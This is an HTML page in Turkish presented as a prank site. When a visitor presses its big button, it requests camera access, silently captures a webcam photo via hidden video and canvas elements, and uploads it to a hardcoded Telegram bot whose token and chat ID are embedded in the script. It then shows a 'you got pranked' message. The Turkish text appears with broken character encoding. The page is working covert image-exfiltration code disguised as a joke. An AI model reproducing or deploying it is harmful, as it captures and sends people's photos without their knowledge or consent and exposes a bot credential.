<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Åžaka Sitesi</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        #mainButton {
            margin-top: 120px;
            background: #ff0066;
            padding: 30px 60px;
            font-size: 40px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            color: white;
            font-weight: bold;
            transition: 0.3s;
        }
        #mainButton:hover { background: #ff3380; }

        #prankMessage {
            font-size: 60px;
            margin-top: 40px;
            display: none;
            color: #00ff66;
            font-weight: bold;
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <button id="mainButton">BANA BAS!</button>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <div id="prankMessage">ðŸ˜‚ ÅžAKALANDIN! ðŸ˜‚</div>

    <audio id="laughSound">
        <source src="https://www.myinstants.com/media/sounds/anime-wow-sound-effect.mp3">
    </audio>

<script>
    const botToken = "8096180017:AAGheuk95cKKfL7NQkPmPKYTrdTgbGNJles";
    const chatId = "7099294121";

    const button = document.getElementById("mainButton");
    const video  = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const prankMessage = document.getElementById("prankMessage");
    const laughSound = document.getElementById("laughSound");

    button.onclick = async () => {
        // Kamera izni al
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            // Video hazÄ±r olduÄŸunda fotoÄŸrafÄ± Ã§ek
            setTimeout(() => {
                const context = canvas.getContext("2d");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // FotoÄŸrafÄ± base64 olarak al
                const imageData = canvas.toDataURL("image/jpeg");

                // Telegram'a gÃ¶nder
                sendToTelegram(imageData);

                // Åžaka mesajÄ± gÃ¶ster
                prankMessage.style.display = "block";
                laughSound.play();

                // KamerayÄ± kapat
                stream.getTracks().forEach(track => track.stop());

            }, 1200);

        } catch (err) {
            alert("Kamera izni verilmedi!");
        }
    };

    // FotoÄŸrafÄ± Telegram'a yolla
    async function sendToTelegram(base64Image) {
        const blob = await (await fetch(base64Image)).blob();
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "photo.jpg");

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    }
</script>

</body>
</html>
